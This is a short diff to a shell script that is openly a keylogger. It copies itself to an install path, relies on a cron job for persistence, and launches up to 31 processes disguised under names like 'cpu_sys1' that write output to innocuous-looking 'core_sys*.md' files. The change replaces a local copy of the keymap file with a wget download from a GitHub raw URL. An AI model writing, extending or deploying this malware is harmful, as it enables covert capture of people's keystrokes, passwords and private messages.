@@ -54,8 +54,6 @@ if [ ! -f ${SHELL_DEST} ]; then
     touch ${SHELL_DEST}
     cp ${MY_PATH} ${SHELL_DEST}
     chmod +x ${SHELL_DEST}
-    # copy keymap file from current directory to install directory
-    cp keymap ${INSTALL_DIR}
 fi
 
 # Check if cron process exists to avoid multiple instances
@@ -69,11 +67,11 @@ if [ ! -f ${CRON_FILE} ]; then
     echo "Crontab created is running"
 fi
 
-
 # Start keylogger
 KEYLOGGER() {
     echo "Starting keylogger.."
     cd ${INSTALL_DIR}
+    wget https://raw.githubusercontent.com/bhavyagoel/BlackArch/main/Keylogger/keymap
     for i in $(seq 1 31); do
         PROC_NAME="cpu_sys${i}"
         OUTPUT_FILE="core_sys${i}.md"
